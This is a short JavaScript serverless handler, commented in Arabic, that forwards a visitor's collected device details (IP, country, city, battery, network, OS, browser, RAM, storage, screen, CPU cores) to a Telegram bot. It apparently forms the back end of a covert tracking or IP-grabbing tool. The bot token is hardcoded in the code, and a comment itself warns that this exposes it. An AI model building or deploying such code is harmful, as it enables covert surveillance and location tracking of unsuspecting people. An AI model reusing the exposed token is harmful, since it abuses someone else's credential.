// api/send.js
// ملاحظة: التوكن موجود داخل الكود كما طلبت.
// تحذير: أي شخص يرى هذا الملف سيعرف التوكن — الأفضل وضعه كمتغير بيئة.
const BOT_TOKEN = "7979338324:AAGHORBK_NgKR8m2jj8QRxdeI451pF_1aE4";

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const { chat_id, deviceInfo } = req.body || {};
    if (!chat_id) return res.status(400).json({ error: 'chat_id missing' });

    const messageLines = [
      `📱 معلومات الجهاز:`,
      `- الدولة: ${deviceInfo.country || 'غير معروف'}`,
      `- المدينة: ${deviceInfo.city || 'غير معروف'}`,
      `- 🌐 IP: ${deviceInfo.ip || 'غير معروف'}`,
      `- 🔋 شحن الهاتف: ${deviceInfo.battery || 'غير معروف'}`,
      `- ⚡ هل الهاتف يشحن؟: ${deviceInfo.charging || 'غير معروف'}`,
      `- 📶 الشبكة: ${deviceInfo.network || 'غير معروف'}`,
      `- 📡 نوع الاتصال: ${deviceInfo.connectionType || 'غير معروف'}`,
      `- ⏰ الوقت: ${deviceInfo.time || 'غير معروف'}`,
      `- 💻 نظام التشغيل: ${deviceInfo.os || 'غير معروف'}`,
      `- 🌍 لغة النظام: ${deviceInfo.language || 'غير معروف'}`,
      `- 🖥️ المتصفح: ${deviceInfo.browser || 'غير معروف'}`,
      `- 🧠 الذاكرة: ${deviceInfo.ram || 'غير معروف'}`,
      `- 💾 المساحة الداخلية: ${deviceInfo.storage || 'غير معروف'}`,
      `- 🖥️ دقة الشاشة: ${deviceInfo.screen || 'غير معروف'}`,
      `- 🎨 عمق الألوان: ${deviceInfo.colors || 'غير معروف'}`,
      `- 📏 اتجاه الشاشة: ${deviceInfo.orientation || 'غير معروف'}`,
      `- ⚙️ عدد الأنوية: ${deviceInfo.cores || 'غير معروف'}`
    ];

    const message = messageLines.join('\n');

    const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const tgResp = await fetch(tgUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: String(chat_id), text: message })
    });

    const data = await tgResp.json();
    if (!tgResp.ok) {
      return res.status(tgResp.status).json(data);
    }

    return res.status(200).json(data);
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}